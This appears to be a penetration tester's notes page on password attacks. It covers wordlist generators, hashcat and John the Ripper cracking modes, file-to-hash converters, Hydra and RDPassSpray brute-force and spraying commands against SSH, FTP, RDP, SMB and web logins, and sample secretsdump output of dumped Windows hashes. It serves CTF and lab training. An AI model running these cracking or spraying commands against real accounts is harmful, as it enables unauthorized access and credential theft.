# Passwords, Hashes and wordlist tools

> Here is a how to for tools useful for passwords attack or generating wordlists
> Notes from my practice and HTB Academy

## Cewl

Cewl can be used to generate a wordlist from a website, this can make you gain a lot of time and it was definitely helpful for me on a lot of CTF ;)  

- `cewl http://website/ > pass.txt`
- `cewl -w pass.txt -m 8 http://website` -m 8 will specify to find words of 8 chars or more we can also use `--lowecase`

## Username generator

During the enumeration phase we might find users last and first name. Username generator can use thoses to generate usernames.  

- `python3 username_generator.py -w wordlist > users.txt` will send in users.txt a list o usernames generated with a wordlist

## Crunch

Crunch will generate a word based on criterias you will need.  

- `crunch -h` will show help and options
- Usage: `crunch min max pattern -o outfile`
- `crunch 8 8 01234abcd -o pass.txt` you will get a list of 8 chars word containing the chars in the pattern 01234abcd
- More advanced options
  - `@` lower case alpha characters
  - `,` upper case alpha characters
  - `%` numeric characters
  - `^` special characters including space
- `crunch 8 8 -t mypass%%` will generate a list of 8 chars word with 2 digits in the end

## Home made script

It can happen for instance that you know the begining of a password or a part of a password, you can use this script to generate 2 to 3 more digits at the end (you can modify it to put it anywhere else in the string)  
And of course we could use crunch as well.

```bash
# bin/bash
for i in {0..999}
do
 echo "mypassword"$i
done
```

## CUPP

CUPP is a very cool tool that will ask you question about your target in order to generate a personnalized wordlist for your target. It can use different languages  

- `python3 cupp.py -i` launch this to start answering question about the target

## hash-identifier

- `hash-identifier`
- Enter your hash
- You will get a list of possible hashs

## hashid

- `hashid <hash-here>`
- You will get a list of possible hashs

## hashcat

- It is a tool that can help crack hashes using a wordlist.
- `hashcat -h` will print help
- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
- the flag `-m` will define the hash mode see all modes [here](https://hashcat.net/wiki/doku.php?id=example_hashes)
- You can find also the proper module using this `hashcat --help | grep <service-you-need>` See the example below

```bash
┌──(root💀kali)-[~/active-directory]
└─# hashcat --help | grep Kerberos
  7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
```

- the flag `-a` will set the attack mode
- We can either give it a single hash or a file
- Adding `--show` will show the crack value if the hash is cracked
- We can use it for Brute-force attack: `-a 3` will specify it is bruteforce `?d?d?d` will use 3 digits from 000 to 999.
- Example: `hashcat -a 3 -m 0 HASH-HERE ?d?d?d`

### Using hashcat with rules

> Source: HTB Academy

Hashcat uses a specific syntax for defining characters and words and how they can be modified. The complete list of this syntax can be found in the official documentation of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.  

|Function|Description|
|--------|-----------|
|:|Do nothing.|
|l|Lowercase all letters.|
|u|Uppercase all letters.|
|c|Capitalize the first letter and lowercase others.|
|sXY|Replace all instances of X with Y.|
|$!|Add the exclamation character at the end.|

Each rule is written on a new line which determines how the word should be mutated.

- In kali rules are located in `/usr/share/hashcat/rules`
- `hashcat -a 0 -m 1000 <HASH-HERE> -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule /usr/share/wordlists/rockyou.txt`

## John the Ripper

### Single Crack mode

Brute force attack.  

- `john --format=<hash_type> <hash or hash_file>`

When we run the command, John will read the hashes from the specified file, and then it will try to crack them by comparing them to the words in its built-in wordlist and any additional wordlists specified with the `--wordlist` option. Additionally, It will use any rules set with the `--rules` option (if any rules are given) to generate further candidate passwords.

John will output the cracked passwords to the console and the file "john.pot" (~/.john/john.pot) in the current directory. Furthermore, it will continue cracking the remaining hashes in the background, and we can check the progress by running the john --show command. To maximize the chances of success, it is important to ensure that the wordlists and rules used are comprehensive and up to date.

|Hash Format|Example Command|Description|
|-----------|---------------|-----------|
|afs|`john --format=afs hashes_to_crack.txt`|AFS (Andrew File System) password hashes|
|bfegg|`john --format=bfegg hashes_to_crack.txt`|bfegg hashes used in Eggdrop IRC bots|
|bf|`john --format=bf hashes_to_crack.txt`|Blowfish-based crypt(3) hashes|
|bsdi|`john --format=bsdi hashes_to_crack.txt`|BSDi crypt(3) hashes|
|crypt(3)|`john --format=crypt hashes_to_crack.txt`|Traditional Unix crypt(3) hashes|
|des|`john --format=des hashes_to_crack.txt`|Traditional DES-based crypt(3) hashes|
|dmd5|`john --format=dmd5 hashes_to_crack.txt`|DMD5 (Dragonfly BSD MD5) password hashes|
|dominosec|`john --format=dominosec hashes_to_crack.txt`|IBM Lotus Domino 6/7 password hashes|
|EPiServer SID hashes|`john --format=episerver hashes_to_crack.txt`|EPiServer SID (Security Identifier) password hashes|
|hdaa|`john --format=hdaa hashes_to_crack.txt`|hdaa password hashes used in Openwall GNU/Linux|
|hmac-md5|`john --format=hmac-md5 hashes_to_crack.txt`|hmac-md5 password hashes|
|hmailserver|`john --format=hmailserver hashes_to_crack.txt`|hmailserver password hashes|
|ipb2|`john --format=ipb2 hashes_to_crack.txt`|Invision Power Board 2 password hashes|
|krb4|`john --format=krb4 hashes_to_crack.txt`|Kerberos 4 password hashes|
|krb5|`john --format=krb5 hashes_to_crack.txt`|Kerberos 5 password hashes|
|LM|`john --format=LM hashes_to_crack.txt`|LM (Lan Manager) password hashes|
|lotus5|`john --format=lotus5 hashes_to_crack.txt`|Lotus Notes/Domino 5 password hashes|
|md4-gen|`john --format=md4-gen hashes_to_crack.txt`|Generic MD4 password hashes|
|md5|`john --format=md5 hashes_to_crack.txt`|MD5 password hashes|
|md5-gen|`john --format=md5-gen hashes_to_crack.txt`|Generic MD5 password hashes|
|mscash|`john --format=mscash hashes_to_crack.txt`|MS Cache password hashes|
|mscash2|`john --format=mscash2 hashes_to_crack.txt`|MS Cache v2 password hashes|
|mschapv2|`john --format=mschapv2 hashes_to_crack.txt`|MS CHAP v2 password hashes|
|mskrb5|`john --format=mskrb5 hashes_to_crack.txt`|MS Kerberos 5 password hashes|
|mssql05|`john --format=mssql05 hashes_to_crack.txt`|MS SQL 2005 password hashes|
|mssql|`john --format=mssql hashes_to_crack.txt`|MS SQL password hashes|
|mysql-fast|`john --format=mysql-fast hashes_to_crack.txt`|MySQL fast password hashes|
|mysql|`john --format=mysql hashes_to_crack.txt`|MySQL password hashes|
|mysql-sha1|`john --format=mysql-sha1 hashes_to_crack.txt`|MySQL SHA1 password hashes|
|NETLM|`john --format=netlm hashes_to_crack.txt`|NETLM (NT LAN Manager) password hashes|
|NETLMv2|`john --format=netlmv2 hashes_to_crack.txt`|NETLMv2 (NT LAN Manager version 2) password hashes|
|NETNTLM|`john --format=netntlm hashes_to_crack.txt`|NETNTLM (NT LAN Manager) password hashes|
|NETNTLMv2|`john --format=netntlmv2 hashes_to_crack.txt`|NETNTLMv2 (NT LAN Manager version 2) password hashes|
|NEThalfLM|`john --format=nethalflm hashes_to_crack.txt`|NEThalfLM (NT LAN Manager) password hashes|
|md5ns|`john --format=md5ns hashes_to_crack.txt`|md5ns (MD5 namespace) password hashes|
|nsldap|`john --format=nsldap hashes_to_crack.txt`|nsldap (OpenLDAP SHA) password hashes|
|ssha|`john --format=ssha hashes_to_crack.txt`|ssha (Salted SHA) password hashes|
|NT|`john --format=nt hashes_to_crack.txt`|NT (Windows NT) password hashes|
|openssha|`john --format=openssha hashes_to_crack.txt`|OPENSSH private key password hashes|
|oracle11|`john --format=oracle11 hashes_to_crack.txt`|Oracle 11 password hashes|
|oracle|`john --format=oracle hashes_to_crack.txt`|Oracle password hashes|
|pdf|`john --format=pdf hashes_to_crack.txt`|PDF (Portable Document Format) password hashes|
|phpass-md5|`john --format=phpass-md5 hashes_to_crack.txt`|PHPass-MD5 (Portable PHP password hashing framework) password hashes|
|phps|`john --format=phps hashes_to_crack.txt`|PHPS password hashes|
|pix-md5|`john --format=pix-md5 hashes_to_crack.txt`|Cisco PIX MD5 password hashes|
|po|`john --format=po hashes_to_crack.txt`|Po (Sybase SQL Anywhere) password hashes|
|rar|`john --format=rar hashes_to_crack.txt`|RAR (WinRAR) password hashes|
|raw-md4|`john --format=raw-md4 hashes_to_crack.txt`|Raw MD4 password hashes|
|raw-md5|`john --format=raw-md5 hashes_to_crack.txt`|Raw MD5 password hashes|
|raw-md5-unicode|`john --format=raw-md5-unicode hashes_to_crack.txt`|Raw MD5 Unicode password hashes|
|raw-sha1|`john --format=raw-sha1 hashes_to_crack.txt`|Raw SHA1 password hashes|
|raw-sha224|`john --format=raw-sha224 hashes_to_crack.txt`|Raw SHA224 password hashes|
|raw-sha256|`john --format=raw-sha256 hashes_to_crack.txt`|Raw SHA256 password hashes|
|raw-sha384|`john --format=raw-sha384 hashes_to_crack.txt`|Raw SHA384 password hashes|
|raw-sha512|`john --format=raw-sha512 hashes_to_crack.txt`|Raw SHA512 password hashes|
|salted-sha|`john --format=salted-sha hashes_to_crack.txt`|Salted SHA password hashes|
|sapb|`john --format=sapb hashes_to_crack.txt`|SAP CODVN B (BCODE) password hashes|
|sapg|`john --format=sapg hashes_to_crack.txt`|SAP CODVN G (PASSCODE) password hashes|
|sha1-gen|`john --format=sha1-gen hashes_to_crack.txt`|Generic SHA1 password hashes|
|skey|`john --format=skey hashes_to_crack.txt`|S/Key (One-time password) hashes|
|ssh|`john --format=ssh hashes_to_crack.txt`|SSH (Secure Shell) password hashes|
|sybasease|`john --format=sybasease hashes_to_crack.txt`|Sybase ASE password hashes|
|xsha|`john --format=xsha hashes_to_crack.txt`|xsha (Extended SHA) password hashes|
|zip|`john --format=zip hashes_to_crack.txt`|ZIP (WinZip) password hashes|

### Wordlist mode

- `john --wordlist=<wordlist_file> --rules <hash_file>` we can specify multiple lists

### Incremental Mode

Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one. This makes it much faster than the brute force attack, where all combinations are tried randomly. Moreover, the incremental mode can also be used to crack weak passwords, which may be challenging to crack using the standard John modes. The main difference between incremental mode and wordlist mode is the source of the password guesses. Incremental mode generates the guesses on the fly, while wordlist mode uses a predefined list of words. At the same time, the single crack mode is used to check a single password against a hash.  

- `john --incremental <hash_file>` read the hashes in the specified hash file and then generate all possible combinations of characters, starting with a single character and incrementing with each iteration. The default character set is limited to a-zA-Z0-9.  If we attempt to crack complex passwords with special characters, we need to use a custom character set.  

### Rule-Based Attack

- John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules:  
`cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF`  
- We can create a rule and add it to the conf file, for example this rule will add a symbol at the beginning of the word and a number at the end:  

```bash
[List.Rules:My-own-rule]
Az"[0-9]" ^[!@#$]
```

### Cracking files

```bash
<tool> <file_to_crack> > file.hash
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
                # OR
john --wordlist=<wordlist.txt> server_doc.hash 
```

|Tool|Description|
|----|-----------|
|pdf2john|Converts PDF documents for John|
|ssh2john|Converts SSH private keys for John|
|mscash2john|Converts MS Cash hashes for John|
|keychain2john|Converts OS X keychain files for John|
|rar2john|Converts RAR archives for John|
|pfx2john|Converts PKCS#12 files for John|
|truecrypt_volume2john|Converts TrueCrypt volumes for John|
|keepass2john|Converts KeePass databases for John|
|vncpcap2john|Converts VNC PCAP files for John|
|putty2john|Converts PuTTY private keys for John|
|zip2john|Converts ZIP archives for John|
|hccap2john|Converts WPA/WPA2 handshake captures for John|
|office2john|Converts MS Office documents for John|
|wpa2john|Converts WPA/WPA2 handshakes for John|

- Find more tools with `locate *2john*`

## Crackmapexec

- `sudo apt-get -y install crackmapexec` install
- `crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>` usage

## Hydra

- Hydra is a very handy tool for when you need to bruteforce auth. It supports a lot of protocols.

### SSH

- `hydra -L users -P pass 10.10.4.129 -t 4 ssh` will use the user list and password list mentioned if you put minus l or minus p you can just specify one user or one password.
**OR**
- `hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v`
- `hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10` Password spraying attack

### FTP

- It is pretty much the same for ftp except you need to add ftp instead of ssh in the end: `hydra -L users -P pass 10.10.4.129 -t 4 ftp` if you have the username you can also do has follow `hydra -l ftp -P passlist.txt ftp://10.10.x.x` (we use `ftp` as the username)

### SMTP

- `hydra -l email@company.xyz -P /path/to/wordlist.txt`

### HTTP logins

- `hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f`

### RDP

- `hydra -L user.list -P password.list rdp://10.129.42.197`

### SMB

- `hydra -L user.list -P password.list smb://10.129.42.197`

## RDPassSpray

- Get it [here](https://github.com/xFreed0m/RDPassSpray). This tool allows you to perform attacks on RDP services
- `python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026`

## Secretdump (Impacket)

- Get SAM hashes with SAM file, SECURITY file and SYSTEM file

```bash
┌──(kali㉿kali)-[~/Documents/offshore/joe-lpt]
└─$ secretsdump.py local -sam SAM -security SECURITY -system SYSTEM                                                                                                                  
Impacket v0.9.24.dev1+20210609.121058.90ce4b7d - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x8d1b3bcb293ec2bacf262ca05e9827c9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:tso3b987b51404eeaad3b435b51404ee:49a159d455162a975ead15763e45817e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:97d6cfe0d16ae931b73c97d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c98d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7025790b5bb6b1c75aff52f9fd307ce1:::
user:1001:aad3b435b51404eeaad3b943b799354ee:4568151a41ac1b353f40f4dc7f90f19d:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x74fc9763584fe15e438782383249a92a395e18d5
dpapi_userkey:0x3fc57e5af5f687620a96c987638dca9c1dd382d3
[*] NL$KM 
 0000   0C EF 72 8A 43 7E B4 55  55 BE ED 92 C6 D9 01 11   ..r.C~.UU.......
 0010   DA 01 E1 C2 E3 83 93 D6  A9 B3 75 42 64 F6 43 86   ..........uBd.C.
 0020   4B 57 29 42 05 FF 94 D7  9E A9 44 9A DE 97 89 FB   KW)B......D.....
 0030   9E 0E A6 86 DB C9 2E 44  6E A7 08 29 D4 F4 FD 66   .......Dn..)...f
NL$KM:0cef728a437eb45555beed92c6d90111da01e1c2e38393d6a9b3754264f643864b98768792ff94d79ea9449ade9789fb9e0ea686dbc92e446ea93264d4f4fd66
[*] Cleaning up... 
```

- You can also work only with SAM and SYSTEM `secretsdump.py local -sam SAM -system SYSTEM`

## Mentalist

- Mentalist is a graphical tool for custom wordlist generation. It utilizes common human paradigms for constructing passwords and can output the full wordlist as well as rules compatible with Hashcat and John the Ripper.
- [Github](https://github.com/sc0tfree/mentalist)

## Resources

{% embed url="https://github.com/digininja/CeWL" %} CeWL {% endembed %}  
{% embed url="https://github.com/shroudri/username_generator" %} Username Generator {% endembed %}  
{% embed url="https://www.kali.org/tools/crunch/" %} Crunch {% endembed %}  
{% embed url="https://github.com/Mebus/cupp" %} CUPP - Common User Passwords Profiler {% endembed %}  
{% embed url="https://www.kali.org/tools/hash-identifier/" %} hash-identifier on kali {% endembed %}  
{% embed url="https://hydra.cc/docs/intro/" %} Hydra {% endembed %}
